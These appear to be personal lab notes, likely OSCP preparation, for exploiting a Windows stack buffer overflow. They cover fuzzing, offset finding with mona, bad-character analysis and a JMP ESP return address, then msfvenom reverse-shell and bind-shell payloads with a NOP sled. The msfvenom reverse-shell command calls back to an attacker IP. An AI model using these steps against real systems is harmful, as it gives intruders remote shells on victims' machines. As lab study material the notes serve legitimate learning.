Buffer Overflow - Windows

run fuzzer.py and get the largest value of crash

![659672f75ba7dff5ac54d9d2df5dab9b.png](../../_resources/c7c110537f064391afc2bbf07bcbabb5.png)

generate cyclic pattern to find offset to EIP register
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
```

copy cyclic pattern to payload variable and run script

run script > program crash

run mona command to calculate offset 

```
!mona findmsp -distance 2000
```

![06051a3581f76c34013d0d9a113f9473.png](../../_resources/96eb04c0a47b47daa8929d3b8ba18b9b.png)

edit script
```
offset = 1978
retn = "BBBB"
```
generate bad chars with script

put bad chars into payload and run

after program crash run mona commands

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

put value of ESP register here

![e0fd351278509b26c26096bbf4a341fe.png](../../_resources/7265a7feac8f4c90bf1a77cc37505934.png)

the path "oscp" is the name of the binary

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0181FA30
```

![3ac21f9071eb1ef93b558613525446f5.png](../../_resources/bde234de758a4213b5f7500f299299f1.png)

00 always bad char
move to next bad char - ignore the next char if sequential
move to next bad char - ignore the next char if sequential
etc ...

find return address
```
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```
can use any return address here

![445651200cc339c00de48848be51e39b.png](../../_resources/298a46fe58c8409f93ffd1af99a92586.png)

example

```
#shown on mona
0x625011d3

#first reverse it
d3115062

#then write as bytes
\xd3\x11\x50\x62

#add to script
retn = "\xd3\x11\x50\x62"
```

generate payload
```
#reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.46.252 LPORT=443 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c

#bind shell
msfvenom -p windows/shell_bind_tcp RHOST=10.10.78.186 LPORT=9000 EXITFUNC=thread -b "\x00\x01\x02\x03\x23\x3c\x83\xba" -f c
```
add to payload

![9f7c4e7db9e82ed3c1e8c7b758d5e5f2.png](../../_resources/9a8a6bfbb2d34fc0a003c23a05d198b1.png)

Prepend NOPs
```
padding = "\x90" * 16
```

run exploit

![275359586a41f8f28567bb3fc19be88f.png](../../_resources/a2c766bbb3c64cc98175ece4d67c590e.png)

reverse shell example

![3ca54dcc865e6cfcdee69318782ce40c.png](../../_resources/732f4bd5725047a890aa7b758e91ac64.png)

bind shell example

![e6ab91562c636e69a103cd443559be63.png](../../_resources/c4fbd7ad044148e0a0112f83941c4732.png)

![f2178ea5e360fadc10bd3a73e2ea7d72.png](../../_resources/a9b4649f77ea48b889f1dd8b415c7b5d.png)